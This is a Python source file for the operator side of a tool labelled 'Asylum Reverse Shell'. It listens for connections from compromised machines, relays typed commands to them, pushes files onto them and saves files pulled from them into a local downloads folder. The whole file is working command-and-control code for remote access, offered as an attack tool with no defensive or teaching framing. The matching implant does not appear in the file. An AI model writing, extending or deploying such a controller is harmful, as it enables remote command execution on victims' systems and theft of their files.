import socket
import threading
from colorama import Fore, init
import pyfiglet
import os
import base64
import queue

init(autoreset=True)
os.system('cls' if os.name == 'nt' else 'clear')

print(Fore.RED + pyfiglet.figlet_format("Asylum"))
print(Fore.GREEN + "             Reverse Shell" + Fore.RESET)
print()

HOST = input("Enter IP==> ")
PORT = int(input("Enter PORT==> "))

command_queue = queue.Queue()

def send_file(conn, filename):
    if not os.path.exists(filename):
        print(f"{Fore.RED}File not found: {filename}{Fore.RESET}")
        return

    with open(filename, 'rb') as f:
        data = f.read()
    encoded_data = base64.b64encode(data)
    conn.sendall(f"UPLOAD {os.path.basename(filename)} {len(encoded_data)}".encode())
    conn.sendall(encoded_data)
    print(f"{Fore.GREEN}File {filename} sent successfully{Fore.RESET}")

def receive_file(conn, filename, size, encoded_data):
    print(f"Attempting to receive file: {filename}, expected size: {size}")
    print(f"Received encoded data: {encoded_data[:100]}...")  # Print first 100 chars
    
    save_path = os.path.join("downloads", filename)
    print(f"Saving file to: {save_path}")
    os.makedirs(os.path.dirname(save_path), exist_ok=True)
    
    try:
        decoded_data = base64.b64decode(encoded_data)
        with open(save_path, 'wb') as f:
            f.write(decoded_data)
        print(f"File content (server side): {decoded_data[:100]}...")  # Print first 100 bytes
        print(f"{Fore.GREEN}File {filename} received and saved to {save_path}{Fore.RESET}")
        print(f"File size: {os.path.getsize(save_path)} bytes")
        return f"File received and saved as {save_path}"
    except Exception as e:
        print(f"{Fore.RED}Error saving file: {e}{Fore.RESET}")
        return f"Error saving file: {e}"

def receive_response(conn):
    response = b""
    while True:
        chunk = conn.recv(4096)
        if not chunk:
            break
        response += chunk
        if response.endswith(b"END\n"):
            break
    return response.decode().strip()[:-4]  # Remove "END\n"

def handle_client(conn, addr):
    print(f"{Fore.GREEN}New connection from {addr}{Fore.RESET}")
    
    def send_commands():
        while True:
            command = command_queue.get()
            if command.lower() == 'exit':
                conn.sendall(command.encode())
                break
            elif command.lower().startswith('upload '):
                _, filename = command.split(' ', 1)
                send_file(conn, filename)
            else:
                conn.sendall(command.encode())

    def receive_responses():
        while True:
            try:
                response = receive_response(conn)
                print(f"Raw response: {response[:100]}...")  # Print first 100 chars of raw response
                if not response:
                    break
                if response.startswith("DOWNLOAD"):
                    try:
                        parts = response.split(' ', 3)
                        if len(parts) != 4:
                            raise ValueError("Invalid response format")
                        _, filename, size, encoded_data = parts
                        print(f"{Fore.YELLOW}Receiving file: {filename}, size: {size}{Fore.RESET}")
                        result = receive_file(conn, filename, int(size), encoded_data)
                        print(f"\n{result}")
                    except ValueError as e:
                        print(f"{Fore.RED}Error: Invalid download response format - {e}{Fore.RESET}")
                elif response.startswith("ERROR:"):
                    print(f"{Fore.RED}{response}{Fore.RESET}")
                else:
                    print(f"\nResponse:\n{response}")
                print(f"\nCommand==>", end="", flush=True)
            except Exception as e:
                print(f"{Fore.RED}Error receiving response: {e}{Fore.RESET}")
                break

    send_thread = threading.Thread(target=send_commands)
    receive_thread = threading.Thread(target=receive_responses)

    send_thread.start()
    receive_thread.start()

    while True:
        command = input("Command==>")
        command_queue.put(command)
        if command.lower() == 'exit':
            break

    send_thread.join()
    receive_thread.join()
    conn.close()
    print(f"{Fore.RED}Connection from {addr} closed{Fore.RESET}")

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind((HOST, PORT))
            s.listen()
            print(f"{Fore.GREEN}Server listening on {HOST}:{PORT}{Fore.RESET}")
            
            while True:
                conn, addr = s.accept()
                client_thread = threading.Thread(target=handle_client, args=(conn, addr))
                client_thread.start()
        except Exception as e:
            print(f"{Fore.RED}Error starting server: {e}{Fore.RESET}")

if __name__ == "__main__":
    start_server()
